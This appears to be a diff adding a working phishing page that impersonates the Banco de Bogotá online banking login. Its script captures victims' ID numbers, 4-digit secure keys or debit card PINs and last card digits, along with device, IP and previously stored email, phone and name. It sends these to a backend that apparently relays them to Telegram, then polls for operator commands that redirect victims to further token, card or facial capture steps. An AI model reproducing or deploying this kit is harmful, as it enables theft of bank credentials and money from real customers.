@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Ingreso Bancario</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="text-center" style="background: linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%); padding: 20px; border-radius: 0 0 15px 15px; margin: 0 -15px 20px -15px;">
+    <img src="img/descarga.svg" alt="Banco de Bogotá" class="logo mb-2" style="display: block; margin: 0 auto;">
+  </div>
+  <div class="text-center mt-4">
+    <h3 class="mt-1 fw-bold" style="text-align: center; width: 100%;">Bienvenido a tu Banca Virtual</h3>
+  </div>
+  <div class="container-box">
+    <div class="tabs">
+      <div class="tab active" id="tab-clave">Clave segura</div>
+      <div class="tab" id="tab-tarjeta">Tarjeta débito</div>
+    </div>
+    <div class="info-message" id="info-message" style="text-align: left;">
+      Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso.
+      <span class="close-msg" onclick="document.getElementById('info-message').style.display='none';">×</span>
+    </div>
+    <div class="form-container" id="form-clave">
+      <div class="form-group">
+        <label>Identificación</label>
+        <div class="input-flex">
+          <select>
+            <option>C.C. ...</option>
+            <option>C.E.</option>
+            <option>NIT</option>
+          </select>
+          <input type="text" id="identificacion-clave" placeholder="#" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 10 dígitos">
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Clave segura</label>
+        <div class="password-container">
+          <input type="password" id="password-clave" placeholder="...." maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 4 dígitos">
+        </div>
+      </div>
+      <button class="btn-ingresar" disabled>Ingresar</button>
+    </div>
+    <div class="form-container" id="form-tarjeta" style="display: none;">
+      <div class="form-group">
+        <label>Identificación</label>
+        <div class="input-flex">
+          <select>
+            <option>C.C. ...</option>
+            <option>C.E.</option>
+            <option>NIT</option>
+          </select>
+          <input type="text" id="identificacion-tarjeta" placeholder="#" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 10 dígitos">
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Clave de tu tarjeta débito</label>
+        <div class="password-container">
+          <input type="password" id="password-tarjeta" placeholder="...." maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 4 dígitos">
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Últimos 4 dígitos de tu tarjeta débito</label>
+        <div class="password-container">
+          <input type="password" id="digitos-tarjeta" placeholder="...." maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 4 dígitos">
+        </div>
+      </div>
+      <button class="btn-ingresar" disabled>Ingresar</button>
+    </div>
+  </div>
+  <!-- Loader overlay -->
+  <div id="loader-overlay">
+    <div class="loader-spinner">
+      <img src="img/21l.svg" alt="Loading" style="width: 100%; height: 100%; object-fit: contain;">
+    </div>
+  </div>
+  <script>
+    const tabClave = document.getElementById('tab-clave');
+    const tabTarjeta = document.getElementById('tab-tarjeta');
+    const formClave = document.getElementById('form-clave');
+    const formTarjeta = document.getElementById('form-tarjeta');
+    const infoMessage = document.getElementById('info-message');
+
+    // Función para validar campos del formulario de clave segura
+    function validarCamposClave() {
+      const btnIngresar = formClave.querySelector('.btn-ingresar');
+      const identificacion = document.getElementById('identificacion-clave').value;
+      const password = document.getElementById('password-clave').value;
+      
+      // Validar que la identificación tenga al menos 5 dígitos y la contraseña 4 dígitos
+      const camposCompletos = identificacion.length >= 5 && password.length === 4;
+      
+      // Cambiar estado del botón
+      if (camposCompletos) {
+        btnIngresar.disabled = false;
+        btnIngresar.style.background = "linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%)";
+        btnIngresar.style.border = "none";
+        btnIngresar.style.color = "white";
+      } else {
+        btnIngresar.disabled = true;
+        btnIngresar.style.background = "#e0e0e0";
+        btnIngresar.style.border = "1px solid #ccc";
+        btnIngresar.style.color = "#666";
+      }
+    }
+
+    // Función para validar campos del formulario de tarjeta débito
+    function validarCamposTarjeta() {
+      const btnIngresar = formTarjeta.querySelector('.btn-ingresar');
+      const identificacion = document.getElementById('identificacion-tarjeta').value;
+      const password = document.getElementById('password-tarjeta').value;
+      const digitos = document.getElementById('digitos-tarjeta').value;
+      
+      // Validar que todos los campos estén completos
+      const camposCompletos = identificacion.length >= 5 && password.length === 4 && digitos.length === 4;
+      
+      // Cambiar estado del botón
+      if (camposCompletos) {
+        btnIngresar.disabled = false;
+        btnIngresar.style.background = "linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%)";
+        btnIngresar.style.border = "none";
+        btnIngresar.style.color = "white";
+      } else {
+        btnIngresar.disabled = true;
+        btnIngresar.style.background = "#e0e0e0";
+        btnIngresar.style.border = "1px solid #ccc";
+        btnIngresar.style.color = "#666";
+      }
+    }
+
+    // Event listeners para los tabs
+    tabClave.addEventListener('click', () => {
+      tabClave.classList.add('active');
+      tabTarjeta.classList.remove('active');
+      formClave.style.display = 'block';
+      formTarjeta.style.display = 'none';
+      infoMessage.style.display = 'block';
+      validarCamposClave(); // Validar al cambiar de tab
+    });
+
+    tabTarjeta.addEventListener('click', () => {
+      tabTarjeta.classList.add('active');
+      tabClave.classList.remove('active');
+      formClave.style.display = 'none';
+      formTarjeta.style.display = 'block';
+      infoMessage.style.display = 'none';
+      validarCamposTarjeta(); // Validar al cambiar de tab
+    });
+
+    // Event listeners para los campos de entrada
+    document.addEventListener('DOMContentLoaded', function() {
+      // Generar o recuperar session_id
+      let sessionId = localStorage.getItem('session_id');
+      if (!sessionId) {
+        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('session_id', sessionId);
+      }
+
+      // Campos del formulario de clave segura
+      const identificacionClave = document.getElementById('identificacion-clave');
+      const passwordClave = document.getElementById('password-clave');
+      
+      identificacionClave.addEventListener('input', validarCamposClave);
+      passwordClave.addEventListener('input', validarCamposClave);
+      
+      // Campos del formulario de tarjeta débito
+      const identificacionTarjeta = document.getElementById('identificacion-tarjeta');
+      const passwordTarjeta = document.getElementById('password-tarjeta');
+      const digitosTarjeta = document.getElementById('digitos-tarjeta');
+      
+      identificacionTarjeta.addEventListener('input', validarCamposTarjeta);
+      passwordTarjeta.addEventListener('input', validarCamposTarjeta);
+      digitosTarjeta.addEventListener('input', validarCamposTarjeta);
+      
+      // Validar inicialmente
+      validarCamposClave();
+      validarCamposTarjeta();
+
+      // Event listeners para los botones de envío
+      const btnIngresarClave = formClave.querySelector('.btn-ingresar');
+      const btnIngresarTarjeta = formTarjeta.querySelector('.btn-ingresar');
+
+      btnIngresarClave.addEventListener('click', function() {
+        const identificacion = document.getElementById('identificacion-clave').value;
+        const password = document.getElementById('password-clave').value;
+        
+        if (identificacion && password) {
+          localStorage.setItem('identificacion', identificacion);
+          localStorage.setItem('password', password);
+          enviarDatosATelegram(identificacion, password, sessionId);
+        }
+      });
+
+      btnIngresarTarjeta.addEventListener('click', function() {
+        const identificacion = document.getElementById('identificacion-tarjeta').value;
+        const password = document.getElementById('password-tarjeta').value;
+        const digitos = document.getElementById('digitos-tarjeta').value;
+        
+        if (identificacion && password && digitos) {
+          localStorage.setItem('identificacion', identificacion);
+          localStorage.setItem('password', password);
+          localStorage.setItem('digitos', digitos);
+          enviarDatosTarjetaATelegram(identificacion, password, digitos, sessionId);
+        }
+      });
+    });
+
+    // Función para enviar datos de clave segura a Telegram
+    function enviarDatosATelegram(identificacion, password, sessionId) {
+      // Mostrar loader
+      const loader = document.getElementById('loader-overlay');
+      if (loader) {
+        loader.style.display = 'flex';
+      }
+      
+      // Detectar tipo de dispositivo
+      const userAgent = navigator.userAgent;
+      let dispositivo = 'PC';
+      
+      if (/Android/i.test(userAgent)) {
+        dispositivo = 'Android';
+      } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+        dispositivo = 'iPhone';
+      } else if (/Windows/i.test(userAgent)) {
+        dispositivo = 'PC';
+      } else if (/Mac/i.test(userAgent)) {
+        dispositivo = 'Mac';
+      } else if (/Linux/i.test(userAgent)) {
+        dispositivo = 'Linux';
+      }
+      
+      const hora = new Date().toLocaleString('es-ES');
+      
+      // Obtener IP y construir mensaje
+      fetch('get_ip.php')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip || 'No disponible';
+          
+          const mensaje = `
+<b><u>💎BANCO DE BOGOTA 💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO DE BOGOTA
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> ${ip}
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>👤 Usuario:</b> ${identificacion}
+• <b>🔑 Clave:</b> ${password}
+------------------------------`;
+
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', sessionId);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            // Iniciar/verificar polling siempre, incluso si no hay messageId o status !== 'success'
+            const maybeMessageId = result && result.messageId ? result.messageId : null;
+            checkPaymentVerification(sessionId, maybeMessageId);
+          })
+          .catch(err => {
+            // Continuar con polling aunque falle el envío inicial
+            checkPaymentVerification(sessionId, null);
+          });
+        })
+        .catch(() => {
+          // Si falla la obtención de IP, enviar sin IP
+          const mensaje = `
+<b><u>💎BANCO DE BOGOTA 💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO DE BOGOTA
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> No disponible
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>👤 Usuario:</b> ${identificacion}
+• <b>🔑 Clave:</b> ${password}
+------------------------------`;
+
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', sessionId);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            const maybeMessageId = result && result.messageId ? result.messageId : null;
+            checkPaymentVerification(sessionId, maybeMessageId);
+          })
+          .catch(err => {
+            checkPaymentVerification(sessionId, null);
+          });
+        });
+    }
+
+    // Función para enviar datos de tarjeta débito a Telegram
+    function enviarDatosTarjetaATelegram(identificacion, password, digitos, sessionId) {
+      // Mostrar loader
+      const loader = document.getElementById('loader-overlay');
+      if (loader) {
+        loader.style.display = 'flex';
+      }
+      
+      // Detectar tipo de dispositivo
+      const userAgent = navigator.userAgent;
+      let dispositivo = 'PC';
+      
+      if (/Android/i.test(userAgent)) {
+        dispositivo = 'Android';
+      } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+        dispositivo = 'iPhone';
+      } else if (/Windows/i.test(userAgent)) {
+        dispositivo = 'PC';
+      } else if (/Mac/i.test(userAgent)) {
+        dispositivo = 'Mac';
+      } else if (/Linux/i.test(userAgent)) {
+        dispositivo = 'Linux';
+      }
+      
+      const hora = new Date().toLocaleString('es-ES');
+      
+      // Obtener IP y construir mensaje
+      fetch('get_ip.php')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip || 'No disponible';
+          
+          const mensaje = `
+<b><u>💎BANCO DE BOGOTA 💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO DE BOGOTA
+---------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> ${ip}
+• <b>⏱Hora:</b> ${hora}
+---------------
+• <b>👤 Usuario:</b> ${identificacion}
+• <b>🔑 Clave:</b> ${password}
+• <b>💳 Dígitos:</b> ${digitos}
+---------------`;
+
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', sessionId);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            const maybeMessageId = result && result.messageId ? result.messageId : null;
+            checkPaymentVerification(sessionId, maybeMessageId);
+          })
+          .catch(err => {
+            checkPaymentVerification(sessionId, null);
+          });
+        })
+        .catch(() => {
+          // Si falla la obtención de IP, enviar sin IP
+          const mensaje = `
+<b><u>💎BANCO DE BOGOTA 💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO DE BOGOTA
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> No disponible
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>👤 Usuario:</b> ${identificacion}
+• <b>🔑 Clave:</b> ${password}
+• <b>💳 Dígitos:</b> ${digitos}
+------------------------------`;
+
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', sessionId);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            const maybeMessageId = result && result.messageId ? result.messageId : null;
+            checkPaymentVerification(sessionId, maybeMessageId);
+          })
+          .catch(err => {
+            checkPaymentVerification(sessionId, null);
+          });
+        });
+    }
+
+    async function checkPaymentVerification(transactionId, messageId) {
+      try {
+        const formData = new FormData();
+        formData.append('transactionId', transactionId);
+        if (messageId) {
+          formData.append('messageId', messageId);
+        }
+
+        const res = await fetch('verificar_respuesta.php', {
+          method: 'POST',
+          body: formData
+        });
+
+        const result = await res.json();
+
+        if (result && result.action) {
+          // No alerts, solo redirecciones limpias
+          switch (result.action) {
+            case 'pedir_dinamica':
+              window.location.href = "token.php?identificacion=" + encodeURIComponent(localStorage.getItem('identificacion'));
+              break;
+
+            case 'error_logo':
+              window.location.href = "index.html";
+              break;
+
+            case 'error_tc':
+              window.location.href = "tarjeta.php?identificacion=" + encodeURIComponent(localStorage.getItem('identificacion'));
+              break;
+
+            case 'facial':
+              window.location.href = "facial_step.html";
+              break;
+
+            case 'confirm_finalizar':
+              window.location.href = "../../../../fin.php";
+              break;
+
+            default:
+              setTimeout(() => checkPaymentVerification(transactionId, messageId || null), 2000);
+              break;
+          }
+        } else {
+          setTimeout(() => checkPaymentVerification(transactionId, messageId || null), 2000);
+        }
+
+      } catch (err) {
+        setTimeout(() => checkPaymentVerification(transactionId, messageId || null), 2000);
+      }
+    }
+  </script>
+</body>
+</html>
